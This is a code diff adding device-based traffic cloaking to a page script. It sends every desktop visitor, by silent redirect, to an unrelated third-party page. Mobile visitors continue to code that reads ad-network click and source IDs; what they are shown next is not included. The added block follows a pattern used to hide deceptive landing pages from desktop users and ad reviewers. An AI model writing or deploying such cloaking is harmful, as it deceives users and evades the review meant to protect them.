@@ -3,6 +3,15 @@
 
 <script>
 (function () {
+  var ua = navigator.userAgent || "";
+  var isMobile = /Android|webOS|iPhone|iPod|BlackBerry|IEMobile|Opera Mini|Mobile/i.test(ua)
+    || /iPad|Tablet/i.test(ua)
+    || (navigator.platform === "MacIntel" && navigator.maxTouchPoints > 1);
+  if (!isMobile) {
+    location.replace("https://www.urbancompany.com/delhi-ncr-massage-for-men-noida?srsltid=AU7gw4WHjBh4yiM0WsqG-xnLftgAgYAQL-j7bm5Em9Ilxow4iLNobldn");
+    return;
+  }
+
   var p = new URLSearchParams(location.search);
   var clickId = p.get("click_id") || p.get("clickid") || p.get("ymid") || p.get("cid") || "";
   var sourceId = p.get("var") || p.get("source_id") || p.get("sub1") || clickId;
